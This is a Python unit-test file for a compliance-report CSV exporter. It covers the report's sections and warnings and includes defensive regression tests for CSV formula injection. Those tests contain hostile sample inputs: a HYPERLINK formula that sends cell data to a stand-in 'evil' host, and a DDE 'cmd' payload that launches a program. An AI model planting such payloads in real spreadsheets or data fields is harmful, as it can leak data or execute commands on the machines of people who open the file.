"""Unit tests for control_center.compliance.csv_export."""
import csv
import io

from control_center.compliance.csv_export import _sanitize_cell, render_report_csv

_CONTEXT = {
    "organization_name": "KUMC Research",
    "organization_id": 1,
    "from_date": "2026-08-01",
    "to_date": "2026-08-31",
    "generated_at": "2026-08-11T12:00:00Z",
    "generated_by": "admin@omnibioai.org",
    "summary": {"total_users": 2, "active_users": 1, "total_rag_queries": 1, "failed_login_attempts": 1, "security_events_requiring_review": 1},
    "user_access": [
        {"user_label": "alice@kumc.edu", "login_count": 5, "last_login": "2026-08-20T10:00:00", "failed_attempts": 0},
    ],
    "rag_queries": [
        {"timestamp": "2026-08-10T09:00:00", "user_label": "alice@kumc.edu", "trace_id": "trace-1"},
    ],
    "security_events": [
        {"timestamp": "2026-08-13T10:00:00", "label": "Role Assignment Denied", "actor_label": "bob@kumc.edu", "outcome": "deny"},
    ],
    "sources_unavailable": [],
}


def test_includes_org_and_period_header():
    text = render_report_csv(_CONTEXT)
    assert "KUMC Research" in text
    assert "2026-08-01" in text
    assert "2026-08-31" in text


def test_includes_all_four_section_markers():
    text = render_report_csv(_CONTEXT)
    assert "## Section 1: Executive Summary" in text
    assert "## Section 2: User Access Log" in text
    assert "## Section 3: RAG Query Log" in text
    assert "## Section 4: Security Events" in text


def test_is_parseable_as_csv():
    text = render_report_csv(_CONTEXT)
    rows = list(csv.reader(io.StringIO(text)))
    assert any(row == ["alice@kumc.edu", "5", "2026-08-20T10:00:00", "0"] for row in rows)
    assert any(row == ["2026-08-10T09:00:00", "alice@kumc.edu", "trace-1"] for row in rows)
    assert any(row == ["2026-08-13T10:00:00", "Role Assignment Denied", "bob@kumc.edu", "deny"] for row in rows)


def test_handles_empty_sections():
    context = {**_CONTEXT, "user_access": [], "rag_queries": [], "security_events": []}
    text = render_report_csv(context)
    assert "## Section 4: Security Events" in text  # doesn't blow up on empty lists


def test_missing_trace_id_renders_as_empty_string():
    context = {**_CONTEXT, "rag_queries": [{"timestamp": "2026-08-10T09:00:00", "user_label": "alice@kumc.edu", "trace_id": None}]}
    text = render_report_csv(context)
    rows = list(csv.reader(io.StringIO(text)))
    assert any(row == ["2026-08-10T09:00:00", "alice@kumc.edu", ""] for row in rows)


def test_summary_uses_renamed_metrics_not_security_incidents():
    text = render_report_csv(_CONTEXT)
    assert "Failed Login Attempts" in text
    assert "Security Events Requiring Review" in text
    assert "Security Incidents" not in text


def test_sources_unavailable_warning_appears_when_present():
    context = {**_CONTEXT, "sources_unavailable": ["RAG query events (omnibioai-billing)"]}
    text = render_report_csv(context)
    assert "WARNING" in text
    assert "RAG query events (omnibioai-billing)" in text


def test_sources_unavailable_warning_absent_when_empty():
    text = render_report_csv(_CONTEXT)
    assert "WARNING" not in text


# ── Pre-merge security review regression: CSV / formula injection ──────

def test_sanitize_cell_prefixes_equals_sign():
    assert _sanitize_cell("=HYPERLINK(\"http://evil\")") == "'=HYPERLINK(\"http://evil\")"


def test_sanitize_cell_prefixes_plus_sign():
    assert _sanitize_cell("+1+1") == "'+1+1"


def test_sanitize_cell_prefixes_minus_sign():
    assert _sanitize_cell("-1+1") == "'-1+1"


def test_sanitize_cell_prefixes_at_sign():
    assert _sanitize_cell("@SUM(1,2)") == "'@SUM(1,2)"


def test_sanitize_cell_leaves_safe_strings_unchanged():
    assert _sanitize_cell("alice@kumc.edu") == "alice@kumc.edu"
    assert _sanitize_cell("KUMC Research") == "KUMC Research"


def test_sanitize_cell_leaves_non_strings_unchanged():
    assert _sanitize_cell(5) == 5
    assert _sanitize_cell(None) is None


def test_sanitize_cell_handles_empty_string():
    assert _sanitize_cell("") == ""


def test_malicious_organization_name_is_neutralized_in_csv_output():
    """The concrete, exploitable vector the pre-merge review flagged:
    Organization.name has no character-class validation in
    omnibioai-auth (app/schemas/orgs.py::OrganizationCreate.name is a
    bare `str`), so any org member with create/rename permission can set
    it to a formula payload. Opening the exported CSV in Excel/Sheets/
    LibreOffice must never execute it."""
    malicious_context = {**_CONTEXT, "organization_name": '=HYPERLINK("http://evil/?x="&A1,"Click me")'}
    text = render_report_csv(malicious_context)
    rows = list(csv.reader(io.StringIO(text)))
    org_row = next(row for row in rows if row and row[0] == "Organization")
    # Prefixed with a leading apostrophe -- spreadsheet apps render this
    # as literal text (hiding the apostrophe itself), never as a live
    # formula, the standard mitigation for this class of vulnerability.
    assert org_row[1].startswith("'=HYPERLINK")


def test_malicious_user_label_is_neutralized_in_csv_output():
    malicious_context = {
        **_CONTEXT,
        "user_access": [{"user_label": "=cmd|'/c calc'!A0", "login_count": 1, "last_login": None, "failed_attempts": 0}],
    }
    text = render_report_csv(malicious_context)
    rows = list(csv.reader(io.StringIO(text)))
    user_row = next(row for row in rows if len(row) > 1 and row[1] == "1" and row[0].startswith("'"))
    assert user_row[0] == "'=cmd|'/c calc'!A0"


def test_malicious_actor_label_in_security_events_is_neutralized():
    malicious_context = {
        **_CONTEXT,
        "security_events": [{"timestamp": "2026-08-13T10:00:00", "label": "Role Assigned", "actor_label": "+1+cmd", "outcome": "success"}],
    }
    text = render_report_csv(malicious_context)
    rows = list(csv.reader(io.StringIO(text)))
    event_row = next(row for row in rows if len(row) > 2 and row[1] == "Role Assigned")
    assert event_row[2] == "'+1+cmd"
